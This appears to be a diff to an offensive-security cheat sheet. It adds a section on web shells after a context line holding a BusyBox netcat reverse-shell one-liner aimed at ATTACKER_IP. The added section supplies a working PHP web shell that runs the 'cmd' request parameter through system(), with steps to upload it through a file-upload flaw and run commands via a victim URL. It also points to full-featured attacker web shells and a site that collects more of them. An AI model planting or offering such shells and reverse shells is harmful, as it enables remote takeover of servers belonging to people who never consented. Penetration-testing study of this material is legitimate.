@@ -396,3 +396,69 @@ busybox nc ATTACKER_IP 443 -e sh
 ```
 Uses BusyBox’s implementation of Netcat (`nc`) to connect to the attacker's IP and execute a shell (`sh`) upon successful connection.
 
+---
+# Web Shells
+
+A **web shell** is a script written in a language supported by a compromised web server that executes commands through the web server itself. It allows attackers to interact with the server’s OS, often with the same privileges as the web server process.
+
+Web shells are typically uploaded using vulnerabilities like:
+- Unrestricted File Upload  
+- File Inclusion (LFI/RFI)  
+- Command Injection  
+- Unauthorized Access  
+
+They can be hidden in various places and evade detection while allowing full control over the compromised server.
+
+---
+
+## Example PHP Web Shell
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+## Explanation:
+1. This is a minimal PHP web shell.
+2. It checks if the cmd parameter exists in the GET request.
+3. If it does, it uses the system() function to execute the command on the server.
+
+## Deployment
+1. Save it as shell.php
+2. Upload it to the target server (e.g., via a file upload vulnerability)
+3. Access it through the browser:
+
+## Example URL to execute whoami:
+
+```bash
+http://victim.com/uploads/shell.php?cmd=whoami
+```
+
+This executes whoami on the server and displays the result in the browser.
+
+## Popular Web Shells Available Online
+Here are some widely used web shells written in PHP, often used by attackers for their extended functionality:
+
+1. [p0wny-shell](https://github.com/flozz/p0wny-shell)
+   - Minimalistic single-file shell
+   - Lightweight
+   - Remote command execution via a small web interface
+![image](https://github.com/user-attachments/assets/fa3adcb8-316b-4629-a86c-02dc89334ae5)
+
+2. [b374k shell](https://github.com/b374k/b374k)
+   - Feature-rich web shell
+   - File manager, command execution, and more
+   - User-friendly interface
+![image](https://github.com/user-attachments/assets/abce5415-3f89-4d8f-8a8c-694672307b84)
+
+3. [c99 shell](https://www.r57shell.net/single.php?id=13)
+   - Robust and full-featured
+   - Often heavily obfuscated
+   - Includes network tools, file handling, and SQL integration
+![image](https://github.com/user-attachments/assets/8efa6775-2374-4ecd-a201-ae1566ac6b80)
+
+You can find more web shells at: https://www.r57shell.net/index.php. 
+
